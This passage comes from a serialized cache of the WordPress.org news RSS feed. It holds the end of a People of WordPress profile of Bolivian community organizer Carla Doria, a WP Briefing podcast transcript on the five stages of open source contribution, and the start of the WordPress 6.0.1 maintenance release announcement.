srcset=\"https://i1.wp.com/wordpress.org/news/files/2022/07/carla-doria-2.jpg?w=600&amp;ssl=1 600w, https://i1.wp.com/wordpress.org/news/files/2022/07/carla-doria-2.jpg?resize=200%2C300&amp;ssl=1 200w\" sizes=\"(max-width: 600px) 100vw, 600px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>Carla began checking the forums as a hobby. She liked that she was able to help people and learn more while doing so. </p>\n\n\n\n<p>Instead of surfing social media during her work breaks, Carla focused on checking the WordPress forums. Through this she learnt about a support job in one of the global firms.</p>\n\n\n\n<p>She felt the job was made for her and was excited to support people in building their websites with WordPress. The role offered the possibility to work remotely and travel while still working.</p>\n\n\n\n<p>After three years as a technical writer, her career felt stuck. She was certain she did not want to return to any job related to industrial engineering. </p>\n\n\n\n<p>Carla did not get through the selection process the first time. But after nearly 18 months between three applications and learning HTML and CSS, Carla finally secured a support job in 2016. With this job, WordPress became her main source of income.</p>\n\n\n\n<h2><strong>Leading a local WordPress community</strong></h2>\n\n\n\n<p>On the job, Carla learned about the WordPress communities around the world and WordCamps. But when somebody asked about the WordPress community where Carla lived, she didn’t know what to say. Was there a community?</p>\n\n\n\n<p>She discovered no local group existed, so she researched what was needed to setup a meetup. Carla discussed the idea with others, but hesitated as she thought it would require an expert WordPress developer to organize.&nbsp;&nbsp;</p>\n\n\n\n<p>But after trying to gauge interest, Carla realized that the only way to find community members was to start a community. In 2017, the <a href=\"https://www.meetup.com/Cochabamba-WordPress-Meetup/\">WordPress community in Cochabamba</a> was born.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"684\" height=\"391\" src=\"https://i0.wp.com/wordpress.org/news/files/2022/07/Comunidad_WP_Cochabamba_FSE_event2022.jpg?resize=684%2C391&#038;ssl=1\" alt=\"The theme preview screen in the WordPress Cochabamba meeting on creating your website with blocks.\" class=\"wp-image-13236\" srcset=\"https://i0.wp.com/wordpress.org/news/files/2022/07/Comunidad_WP_Cochabamba_FSE_event2022.jpg?w=684&amp;ssl=1 684w, https://i0.wp.com/wordpress.org/news/files/2022/07/Comunidad_WP_Cochabamba_FSE_event2022.jpg?resize=300%2C171&amp;ssl=1 300w\" sizes=\"(max-width: 684px) 100vw, 684px\" data-recalc-dims=\"1\" /><figcaption class=\"wp-element-caption\"><em>WordPress meeting in Cochabamba explored creating your website with blocks</em></figcaption></figure>\n\n\n\n<p>The group has had ups and downs, probably similar to any other community. Although Cochabamba is not a big city, they had issues finding a location that was free and available to anyone who wanted to join. People came with different levels of knowledge, from people with&nbsp;vast experience with WordPress to people with no experience but who wanted to learn.&nbsp;</p>\n\n\n\n<p>The community grew during the pandemic, as meetups went online and people from other cities in Bolivia were able to attend. After restrictions were lifted, there was a lot of excitement amongst members to meet each other in person.</p>\n\n\n\n<h2><strong>Giving back through speaking</strong></h2>\n\n\n\n<figure class=\"wp-block-image aligncenter size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"600\" height=\"900\" src=\"https://i1.wp.com/wordpress.org/news/files/2022/07/carla-doria-1.jpg?resize=600%2C900&#038;ssl=1\" alt=\"Carla reading a book under a tree\" class=\"wp-image-13191\" srcset=\"https://i1.wp.com/wordpress.org/news/files/2022/07/carla-doria-1.jpg?w=600&amp;ssl=1 600w, https://i1.wp.com/wordpress.org/news/files/2022/07/carla-doria-1.jpg?resize=200%2C300&amp;ssl=1 200w\" sizes=\"(max-width: 600px) 100vw, 600px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>The community also helped Carla to develop a new skill in public speaking. She applied to be a speaker at WordCamp Mexico <a href=\"https://mexicocity.wordcamp.org/2019/\">2019</a> and <a href=\"https://mexicocity.wordcamp.org/2020/\">2020</a>, <a href=\"https://guayaquil.wordcamp.org/2019/\">WordCamp Guayaquil 2019</a>, and <a href=\"https://colombia.wordcamp.org/2020/\">WordCamp Colombia in 2020</a>. Her confidence grew while she enjoyed connecting with other communities and meeting people who were on similar pathways. Not all of them were developers, as she had presumed. Many, like her, started out as bloggers.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><img decoding=\"async\" loading=\"lazy\" width=\"977\" height=\"419\" src=\"https://i1.wp.com/wordpress.org/news/files/2022/07/WCC.png?resize=977%2C419&#038;ssl=1\" alt=\"WordCamp Cochabamba\'s logo with blue and grey lettering and a hat\" class=\"wp-image-13228\" srcset=\"https://i1.wp.com/wordpress.org/news/files/2022/07/WCC.png?w=977&amp;ssl=1 977w, https://i1.wp.com/wordpress.org/news/files/2022/07/WCC.png?resize=300%2C129&amp;ssl=1 300w, https://i1.wp.com/wordpress.org/news/files/2022/07/WCC.png?resize=768%2C329&amp;ssl=1 768w\" sizes=\"(max-width: 977px) 100vw, 977px\" data-recalc-dims=\"1\" /></figure>\n\n\n\n<p>Finally, after three years, Carla applied to organize her first WordCamp in 2021 in <a href=\"https://cochabamba.wordcamp.org/2021/\">Cochabamba</a>. She had never imagined organizing any WordCamp, and through this having the experience to talk to sponsors and contact companies, and lead a group of people with different talents and backgrounds. Carla felt she had learnt so much from the experience.</p>\n\n\n\n<p>Thanks to WordPress, Carla found a job she enjoyed, was able to work remotely, and help build something in her community to help people learn skills and find career opportunities.</p>\n\n\n\n<p>Carla feels grateful for all she has been able to do thanks to WordPress. She said: “WordPress has led me to find good jobs. It also has allowed me to contribute to a community of friends that love learning about WordPress.”  </p>\n\n\n\n<h2>Share the stories</h2>\n\n\n\n<p>Help share these stories of open source contributors and continue to grow the community. Meet more WordPressers in the <a href=\"https://wordpress.org/news/category/newsletter/interviews/\">People of WordPress series</a>.</p>\n\n\n\n<h2>Contributors</h2>\n\n\n\n<p>Thanks to Alison Rothwell (<a href=\'https://profiles.wordpress.org/wpfiddlybits/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>wpfiddlybits</a>), Abha Thakor (<a href=\'https://profiles.wordpress.org/webcommsat/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>webcommsat</a>), Larissa Murillo (<a href=\'https://profiles.wordpress.org/lmurillom/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>lmurillom</a>), Meher Bala (<a href=\'https://profiles.wordpress.org/meher/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>meher</a>), Chloe Bringmann (<a href=\'https://profiles.wordpress.org/cbringmann/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>cbringmann</a>), and Surendra Thakor (<a href=\'https://profiles.wordpress.org/sthakor/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>sthakor</a>) for work on this feature, and to all the contributors who helped with the series recently. Thank you too to Carla Doria (<a href=\'https://profiles.wordpress.org/carlisdm/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>carlisdm</a>) for sharing her experiences.</p>\n\n\n\n<p>Thank you to Josepha Haden (@chantaboune) and Topher DeRosia (<a href=\'https://profiles.wordpress.org/topher1kenobe/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>topher1kenobe</a>) for their support of the People of WordPress series.</p>\n\n\n\n<div class=\"wp-block-media-text is-stacked-on-mobile is-vertically-aligned-center\" style=\"grid-template-columns:29% auto\"><figure class=\"wp-block-media-text__media\"><img decoding=\"async\" loading=\"lazy\" width=\"180\" height=\"135\" src=\"https://i1.wp.com/wordpress.org/news/files/2020/03/heropress_logo_180.png?resize=180%2C135&#038;ssl=1\" alt=\"HeroPress logo\" class=\"wp-image-8409 size-full\" data-recalc-dims=\"1\" /></figure><div class=\"wp-block-media-text__content\">\n<p class=\"has-small-font-size\"><em>This People of WordPress feature is inspired by an essay originally published on </em><a href=\"https://heropress.com/\"><em>HeroPress.com</em></a><em>, a community initiative created by Topher DeRosia. It highlights people in the WordPress community who have overcome barriers and whose stories might otherwise go unheard. </em>#HeroPress </p>\n</div></div>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13201\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:20;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:64:\"WP Briefing: Episode 36: Beginner’s Guide to Contributions 2.0\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:83:\"https://wordpress.org/news/2022/07/episode-36-beginners-guide-to-contributions-2-0/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 25 Jul 2022 11:05:33 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13162\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:164:\"Thinking of contributing to WordPress? Josepha Haden Chomphosy guides you through the five stages of contribution on the latest episode of the WP Briefing podcast! \";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/07/WP-Briefing-036.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:16474:\"\n<p>In the thirty-sixth episode of the WordPress Briefing, Josepha Haden Chomphosy revisits the Beginner&#8217;s Guide to Contributions to the WordPress open source project. </p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<p>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/beafialho/\">Beatriz Fialho</a><br>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a><br>Song: Fearless First by Kevin MacLeod</p>\n\n\n\n<h2>References</h2>\n\n\n\n<ol><li><a href=\"https://make.wordpress.org/performance\" data-type=\"URL\" data-id=\"make.wordpress.org/performance\">Performance Team Information</a></li><li><a href=\"https://make.wordpress.org/community/2022/07/07/wcus2022-contributor-team-signup/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/community/2022/07/07/wcus2022-contributor-team-signup/\">WordCamp US Contributor Day Table Lead Info</a></li><li><a href=\"https://make.wordpress.org/test/2022/07/11/fse-program-testing-call-15-category-customization/\">Call for Testing #15: Category Customization </a></li><li><a href=\"https://europe.wordcamp.org/2019/contributor-orientation-tool/\">Contributor Quizlet</a></li></ol>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13162\"></span>\n\n\n\n<p>[Josepha Haden Chomphosy 00:00:10]&nbsp;&nbsp;</p>\n\n\n\n<p>Hello everyone, and welcome to the WordPress Briefing. The podcast where you can catch quick explanations of some of the ideas behind the WordPress open source project and the community around it, as well as get a small list of big things coming up in the next two weeks. I&#8217;m your host Josepha Haden Chomphosy.</p>\n\n\n\n<p>Here we go.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:00:40]&nbsp;&nbsp;</p>\n\n\n\n<p>WordPress is an open source software project and, like many other open source software projects, has an entire community of people who show up to help improve it however they can. Most of you probably use WordPress every day in some way. And I&#8217;m going to assume that since you listen to this podcast, you&#8217;re also interested in how this all works.</p>\n\n\n\n<p>One of the things I mention practically every episode is that WordPress works and continues to work because of generous contributions from people all around the world. I consider my work with WordPress to be my way of giving back for everything that this software enabled me and my family to do. But I once was a first-time contributor, and I remember what it felt like before I knew everything.&nbsp;</p>\n\n\n\n<p>I felt like it moved at the speed of light and that I could never tell what to do now, let alone what to do next. And that everyone around me basically already knew everything. And if you are feeling that way right now, I encourage you to take a big deep breath [breathe] and let me help you get started.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:01:43]&nbsp;&nbsp;</p>\n\n\n\n<p>I&#8217;m a roadmap sort of person. So I&#8217;m going to start by sharing the stages I&#8217;ve observed for folks who are contributing to open source. That way, you can tell where you are right now, which spoiler alert is probably a bit further along than you realize. Then I&#8217;ll give you some questions you can ask yourself for each stage to figure out what is a good fit for you. Think of it as a guided exploration.&nbsp;</p>\n\n\n\n<p>All right, the five stages. So these are they:&nbsp;</p>\n\n\n\n<ol><li><strong>Connecting</strong>. That&#8217;s when you&#8217;re first learning about the community. You know WordPress exists, but now you&#8217;ve just discovered that the community exists. That&#8217;s where you are.&nbsp;</li><li>The second phase is <strong>Understanding</strong>. It&#8217;s when you are researching the community, like, you know it exists, you think you want to give back, and so you&#8217;re trying to figure out where everything is.&nbsp;</li><li>The third phase is what I call <strong>Engaging</strong>. It&#8217;s when you&#8217;re first interacting, you&#8217;ve downloaded the CMS, you have figured out which team you think you&#8217;re interested in, and you&#8217;re headed to events or meetings or whatever.&nbsp;</li><li>The fourth stage is one that I refer to as <strong>Performing</strong>. And that&#8217;s when you&#8217;ve decided that you&#8217;re gonna volunteer and you&#8217;re gonna take some action. You&#8217;re going to like a contributor day or running a release or whatever. I think that&#8217;s probably not the first place you land, running a release is probably a lot, but, you know, coordinating work on the release or something like that.&nbsp;</li><li>And then phase five, which is the <strong>Leading</strong> phase. That&#8217;s when you&#8217;re taking responsibility for things getting done.&nbsp;</li></ol>\n\n\n\n<p>[Josepha Haden Chomphosy 00:03:08]&nbsp;&nbsp;</p>\n\n\n\n<p>Before we get any further, there are four important things to remember about those stages.</p>\n\n\n\n<p>The first thing to remember is that there is no set time between any of those stages. You can start in one and then three years later go to the next one, or you can start in one and go into the next stage tomorrow. The next thing to know is that each stage builds on the one before it. In my observation, anytime I have seen a contributor who feels like they&#8217;re really struggling, it&#8217;s because they skipped a stage in there, which really causes some trouble for them.</p>\n\n\n\n<p>The next thing to remember is that not everyone will make it through these stages, which is okay. The majority of the community stops at three. Most contributors stop at four. And that is perfectly fine. That is expected. That is normal and completely in line with what we expect from contribution.</p>\n\n\n\n<p>Uh, and the final thing to remember about that list of the phases is that very few people make it into that leadership stage. If we assume, like I do, that 1% of the people who are using WordPress also show up and contribute back to WordPress, then it&#8217;s kind of safe to assume also that about 1% of those people who have shown up to contribute to WordPress are moving into a space where they feel like they&#8217;re willing to take responsibility for making sure things get done in WordPress.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:04:31]&nbsp;&nbsp;</p>\n\n\n\n<p>Like we all collectively feel responsible for WordPress&#8217;s success, but in that leadership area, you&#8217;re kind of taking responsibility for 40% of the web or whatever&#8217;s going on there. And not a lot of people make it there, and that is completely fine, too. So that&#8217;s our basic terminology today. Those are the caveats that go with our basic terminology.</p>\n\n\n\n<p>Most difficulties that arise for new contributors happen because a stage got skipped somewhere along the way. It&#8217;s almost never intentional, but from what I&#8217;ve observed, that&#8217;s what makes it really difficult to get started and what makes it difficult to keep going once you&#8217;ve kind of already gotten in there.</p>\n\n\n\n<p>So, all right. Big breath, folks with me again [breathe]. Alright, it&#8217;s guided exploration time.&nbsp;</p>\n\n\n\n<p>First phase, the connecting phase. Remember, this is where you&#8217;ve just learned the community exists, people are talking about it, you don&#8217;t know much more. The first step for you is asking yourself what it is you could do. Or if there&#8217;s a project out there that looks particularly interesting.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:05:36]&nbsp;&nbsp;</p>\n\n\n\n<p>So you can ask yourself questions, like, am I a writer? And if I am a writer, do I write technical or prose. The other thing you can ask is, am I a PHP developer, a JavaScript developer, Python, Go; which language am I writing in because I find it most beautiful. Another thing you can ask yourself is, am I a teacher or a mentor, or do I just generally like to be a mighty helper? And I like to make sure that things keep running.&nbsp;</p>\n\n\n\n<p>So once you&#8217;ve asked yourself those things, it&#8217;s on to phase two, the understanding phase. This is when you&#8217;re looking around at this new-to-you community to see what is happening where. So you take a look at the teams that are around, you think about whatever it was you said you were good at in the last question and you look at which teams might be a good fit.&nbsp;</p>\n\n\n\n<p>So if you said that you&#8217;re a good technical writer, then Docs probably is for you. Have you been training others to use WordPress for years? Then you might wanna look into Training. There are a lot of other things, obviously, like if you think you&#8217;re good at working with code PHP or JavaScript, you&#8217;re probably gonna end up in Core.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:06:46]&nbsp;&nbsp;</p>\n\n\n\n<p>If you are particularly good at any of the other tech stacks that we have around in our Trac area or an Openverse, then that&#8217;s where you&#8217;ll land over there. You have design options. Like if design is really your thing, we have a Design team, but we also have a Themes team. There are plenty of places that you can land depending on what it is that you feel like you are the best at and could really help the WordPress project. And so that&#8217;s your phase two.&nbsp;</p>\n\n\n\n<p>Now that you have gotten a good guess at a team, we&#8217;re gonna swing through to phase three, which is the engaging phase. This is the phase that is the scariest for most people, but it&#8217;s okay. I am here for you. I am here for you in this podcast. So you have figured out what you want to do in order to contribute, and you&#8217;ve got a sense for the team that looks right. There are two things that you do next.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:07:34]&nbsp;&nbsp;</p>\n\n\n\n<p>One is that you can go to a meeting. There are many kinds of meetings. There are team meetings, bug scrubs, and testing sessions, but they&#8217;re all in Slack, which means that you can attend one from anywhere. When they kick off, you wave, you introduce yourself, you let everybody know that you&#8217;re there and you&#8217;re observing. Folks will welcome you and just kind of give you some concept of what they&#8217;re working on. Easy as that. You&#8217;ve done your first time meeting attendance.&nbsp;</p>\n\n\n\n<p>Another good option is to keep an eye out for specific events. Some of those events happen online, like Global Translation Day. But also some of them happen in person like, Meetups or WordCamps. And there again, you show up, you wave, you introduce yourself, see if you can make a connection or two, let people know that you&#8217;re new and you&#8217;re just trying to figure out where you are and what you wanna do.&nbsp;</p>\n\n\n\n<p>If you&#8217;ve made it now, all the way to phase four, the performing phase, then give yourself a little pat on the back! Figuring out where you want to go and who your friendly faces are is the biggest challenge when you get started. So congratulations!&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:08:37]&nbsp;&nbsp;</p>\n\n\n\n<p>Phase four is the phase where you&#8217;ve decided you&#8217;re brave enough to volunteer &#8211; to do some contribution. You&#8217;re volunteering your time. That&#8217;s where you are now. So oddly enough, you start this phase by assigning yourself something, assigning yourself, a task. This seems counterintuitive.</p>\n\n\n\n<p>There&#8217;s this feeling that you can&#8217;t say that you&#8217;re gonna do something. That you can&#8217;t just assign something to yourself and say that you&#8217;re gonna do it. But in open source projects, you always can. You find a task where you&#8217;re comfortable, and you just mention that you would like to give it a try while the team is having their weekly meeting. And it&#8217;s simple as that. And not big things either. Like organizing an event or maintaining a component, those are probably too big for your first time around.</p>\n\n\n\n<p>I&#8217;m talking things like, &#8216;I will test that patch that you mentioned in the meeting.&#8217; Or &#8216;I will review the docs and make sure that they&#8217;re up to date with the most recent release.&#8217; Or &#8216;I can help run meetings for the next release.&#8217;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:09:40]&nbsp;&nbsp;</p>\n\n\n\n<p>And then you have phase five, where you just repeat phase four until you are leading something! And I don&#8217;t mean leading in the 1950s sort of way, where you have like a corner office and you&#8217;re ordering people around. I mean, in the warm, inviting millennial way where you&#8217;re leading by inspiring people to do something or you&#8217;re leading because you make sure that the meeting happens every single week.</p>\n\n\n\n<p>Or you&#8217;re leading because you added screenshots to tickets that needed testing and so you moved something forward in a way that was helpful. Easy peasy. You can go to your first contributor today or a WordPress Slack meeting and just be a contributor by the time you leave, right? You might feel like ‘easy as that isn&#8217;t quite the right set of words right there. And as a matter of fact, you might be thinking to yourself, this woman is just plain wrong. It could not possibly be that easy. And I agree. It really isn&#8217;t literally quote-unquote just that easy. Just like handing someone a notebook and a pen will not instantly make them an award-winning novelist, handing someone a wordpress.org profile and credentials to Slack won&#8217;t instantly make them a contributor.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:10:46]&nbsp;&nbsp;</p>\n\n\n\n<p>For both of those examples, what makes someone good is the ability to try and fail and still be encouraged to try again. So if it&#8217;s been a while since you contributed and you&#8217;re thinking about returning, or if you&#8217;ve been listening to me for a while and you&#8217;re ready to give this contribution thing a try, I hope this helps you to feel brave enough to try and brave enough to fail.</p>\n\n\n\n<p>And I encourage you to be brave enough to try again.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:11:20]&nbsp;&nbsp;</p>\n\n\n\n<p>Let&#8217;s take a look at our small list of big things. My friends, we have a Performance team. This team has been a working group for a long time and is focused on some deep, inner workings of WordPress and its surrounding ecosystem to make sure that we are as fast and slick as possible. You can check them out on make.wordpress.org/performance, their brand new site, and see when they&#8217;re meeting, what they&#8217;re aiming to get into the WordPress 6.1 release, and if that&#8217;s something that you would like to contribute to.&nbsp;</p>\n\n\n\n<p>The second thing is that there&#8217;s a brand new call out for testing. This time it&#8217;s focused on templates and retroactively applying them to an entire category of posts. So it&#8217;s a little bit workflow testing, a little bit technology testing, and we could really use your help in bug hunting for both of those things.</p>\n\n\n\n<p>And the final thing is that you know since contribution is obviously the focus of today&#8217;s podcast, we are looking for table leads for WordCamp US’ contributor day that&#8217;s coming up in September. There&#8217;s a whole blog post about it, I&#8217;ll link to it in the show notes so that you&#8217;ll have all the info and can raise your hand if you want.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:12:25]&nbsp;&nbsp;</p>\n\n\n\n<p>And speaking of things that I&#8217;ll have in the show notes, I also am going to put like a contributor quizlet guide thing. If the guided, figuring out of the teams in the phase two section, if that didn&#8217;t make any sense to you and you just need something to direct you specifically to potential teams, I&#8217;m gonna link to the contributor kind of sorting hat quiz that came out with WordCamp Europe. And that should help you work your way through phase two and get ready for phase three if that is where the spirit takes you.&nbsp;</p>\n\n\n\n<p>And that, my friends, is your small list of big things. Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy. And I&#8217;ll see you again in a couple of weeks.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13162\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:21;a:6:{s:4:\"data\";s:69:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"WordPress 6.0.1 Maintenance Release\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:71:\"https://wordpress.org/news/2022/07/wordpress-6-0-1-maintenance-release/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 12 Jul 2022 16:58:14 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:5:{i:0;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:3:\"6.0\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:5:\"6.0.1\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:14:\"minor-releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13138\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:236:\"WordPress 6.0.1 is now available for download. This maintenance release features several updates since the release of WordPress 6.0 in May 2022. You can review a summary of the key changes in this release by visiting WordPress.org/news.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:11:\"Dan Soschin\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:5452:\"\n<h2>WordPress 6.0.1 is now available</h2>\n\n\n\n<p>This maintenance release features <a href=\"https://core.trac.wordpress.org/query?milestone=6.0.1\">13 bug fixes in Core</a> and <a href=\"https://github.com/WordPress/gutenberg/commits/wp/6.0\">18 bug fixes</a> for the Block Editor. WordPress 6.0.1 is a short-cycle maintenance release. You can review a summary of the key updates in this release by reading the <a href=\"https://make.wordpress.org/core/2022/07/05/wordpress-6-0-1-rc-1-is-now-available/\">RC1 announcement</a>.</p>\n\n\n\n<p>The next major release will be <a href=\"https://make.wordpress.org/core/2022/06/23/wordpress-6-1-planning-roundup/\">version 6.1</a> planned for later in 2022.</p>\n\n\n\n<p>If you have sites that support automatic background updates, the update process will begin automatically.</p>\n\n\n\n<p>You can <a href=\"https://wordpress.org/wordpress-6.0.1.zip\">download WordPress 6.0.1 from WordPress.org</a>, or visit your WordPress Dashboard, click “Updates”, and then click “Update Now”.</p>\n\n\n\n<p>For more information, check out the <a href=\"https://wordpress.org/support/wordpress-version/version-6-0-1/\">version 6.0.1 HelpHub documentation page</a>.</p>\n\n\n\n<h2>Thank you to these WordPress contributors</h2>\n\n\n\n<p>The WordPress 6.0.1 release is led by <a href=\"https://profiles.wordpress.org/sergeybiryukov/\">@sergeybiryukov</a> and <a href=\"https://profiles.wordpress.org/zieladam/\">@zieladam</a>.</p>\n\n\n\n<p>WordPress 6.0.1 would not have been possible without the contributions of more than 50 people. Their asynchronous coordination to deliver several enhancements and fixes into a stable release is a testament to the power and capability of the WordPress community.</p>\n\n\n\n<p><a href=\"https://profiles.wordpress.org/zieladam/\">Adam 